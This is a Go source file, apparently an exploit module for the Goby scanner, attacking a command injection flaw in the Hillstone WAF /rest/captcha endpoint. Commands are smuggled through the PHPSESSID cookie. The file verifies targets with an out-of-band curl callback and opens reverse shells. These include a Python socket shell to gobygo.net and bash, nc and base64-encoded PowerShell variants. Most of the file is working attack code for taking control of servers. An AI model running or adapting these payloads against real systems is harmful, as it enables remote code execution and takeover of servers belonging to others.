package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Hillstone WAF /captcha Command Execution Vulnerability",
    "Description": "<p>Hillstone Web Application Firewall (WAF) is a professional and intelligent web application security protection product, which comprehensively applies intelligent analysis and semantic analysis technology in web asset discovery, vulnerability assessment, traffic learning, threat positioning, etc., to help users easily deal with application-layer risks and ensure the all-weather security operation of websites.  </p><p>On the verification code page of WAF, a command injection vulnerability exists, which allows a malicious attacker to construct a malicious request and splice commands to execute arbitrary code to control the server.</p>",
    "Product": "Hillstone-Traffic-MGMT",
    "Homepage": "http://www.hillstonenet.com.cn/",
    "DisclosureDate": "2024-02-29",
    "PostTime": "2024-09-06",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "((title=\"Hillstone\" && title=\"Hillstone Networks\" && body=\"Hillstone\") || (title=\"Web Management\" && body=\"images/login_BG.gif\" && body=\"'Hillstone Networks', 'hillstone-logo.gif'\"))",
    "GobyQuery": "((title=\"Hillstone\" && title=\"Hillstone Networks\" && body=\"Hillstone\") || (title=\"Web Management\" && body=\"images/login_BG.gif\" && body=\"'Hillstone Networks', 'hillstone-logo.gif'\"))",
    "Level": "2",
    "Impact": "<p>On the verification code page of WAF, a command injection vulnerability exists, which allows a malicious attacker to construct a malicious request and splice commands to execute arbitrary code to control the server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/141566415"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "山石网科 Web 应用防火墙（WAF）/captcha 命令执行漏洞",
            "Product": "Hillstone-流量管理",
            "Description": "<p>山石网科 Web 应用防火墙（WAF）是专业智能的Web 应用安全防护产品，在Web资产发现、漏洞评估、流量学习、威胁定位等方面全面应用智能分析和语义分析技术，帮助用户轻松应对应用层风险，确保网站全天候的安全运营。&nbsp;</p><p>在WAF的验证码页面，存在命令注入漏洞，恶意攻击者可通过构造恶意请求，拼接命令执行任意代码，控制服务器。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>在WAF的验证码页面，存在命令注入漏洞，恶意攻击者可通过构造恶意请求，拼接命令执行任意代码，控制服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Hillstone WAF /captcha Command Execution Vulnerability",
            "Product": "Hillstone-Traffic-MGMT",
            "Description": "<p>Hillstone Web Application Firewall (WAF) is a professional and intelligent web application security protection product, which comprehensively applies intelligent analysis and semantic analysis technology in web asset discovery, vulnerability assessment, traffic learning, threat positioning, etc., to help users easily deal with application-layer risks and ensure the all-weather security operation of websites.&nbsp;&nbsp;</p><p>On the verification code page of WAF, a command injection vulnerability exists, which allows a malicious attacker to construct a malicious request and splice commands to execute arbitrary code to control the server.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>On the verification code page of WAF, a command injection vulnerability exists, which allows a malicious attacker to construct a malicious request and splice commands to execute arbitrary code to control the server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9950"
}`
	setPayloadRequestHashcxnakcgscascasuacxvtavscxzVMGXcsfja := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		vulURL = "/rest/captcha"
		requestConfig := httpclient.NewGetRequestConfig(vulURL)
		command = url.QueryEscape(command)
		//将command中的空格替换为${IFS}
		command = strings.ReplaceAll(command, "%20", "${IFS}")
		command = strings.ReplaceAll(command, "+", "${IFS}")
		//对command进行url编码
		PHPSESSID := "PHPSESSID=aaaaaaaaaa%3b" + command + "|sh%3bd"
		requestConfig.Header.Store("Cookie", PHPSESSID)
		requestConfig.VerifyTls = false
		requestConfig.Timeout = 20
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			ok = false
			return ok, vulURL, err
		}
		ok = true
		return ok, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashcxnakcgscascasuacxvtavscxzVMGXcsfja

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			if isDomain {
				checkUrl = "http://" + godclient.GetGodServerIP() + "/U" + strings.Split(checkUrl, ".")[1] + "." + strings.Split(checkUrl, ".")[0]
			}

			// 请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || ok == false {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*25) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashcxnakcgscascasuacxvtavscxzVMGXcsfja

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c {echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					//对command进行url编码,post请求也必须url编码提高成功率
					command = url.QueryEscape(command)
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
